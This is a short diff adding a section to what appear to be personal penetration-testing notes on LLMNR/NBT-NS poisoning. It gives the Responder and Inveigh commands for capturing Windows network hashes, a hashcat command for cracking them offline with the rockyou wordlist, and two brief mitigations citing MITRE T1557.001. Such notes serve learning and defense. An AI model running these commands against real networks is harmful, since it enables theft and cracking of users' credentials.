@@ -80,3 +80,25 @@ Set-SmbServerConfiguration -RequireSecuritySignature $true
 Set-SmbClientConfiguration -RequireSecuritySignature $true
 ```
 
+
+
+# Sniffing for foothold
+- Using `responder.py` from Linux attacking host
+```bash
+sudo responder -I <Interface-Name> -wfv
+```
+- Using `Inviegh.ps1` from Windows machine 
+```powershell
+Import-Module .\Inveigh.ps1
+(Get-Command Invoke-Inveigh).Parameters
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+- Cracking them Offline
+```bash
+hashcat -m 5600 svc_qualys.hash /usr/share/wordlists/rockyou.txt
+```
+## Mitigations for LLMNR/NTB-NS Poisoning
+#### Mitre ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), `Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`.
+1. Disable LLMNR/NTB-NS protocols, But first they should be tested if this would cause failure in any systems
+2. Monitor the traffic on the Ports for both protocols
+---
